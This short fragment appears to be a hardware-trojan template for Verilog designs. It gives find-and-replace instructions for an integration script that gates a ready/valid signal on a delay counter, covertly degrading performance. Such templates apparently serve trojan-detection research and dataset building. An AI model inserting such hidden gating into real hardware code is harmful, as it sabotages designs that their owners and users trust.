 ...
 * Payload: Delay valid by N cycles
 * 
...
// ============================================================
// Performance Degradation: Delay valid by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF valid is a ready/valid signal:
//   Find: assign valid = ready_condition;
//   Replace: assign valid = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF valid is in always_ff:
//   Find: valid <= ready_value;
//   Replace: valid <= (delay_counter == 0) ? ready_value : 1'b0;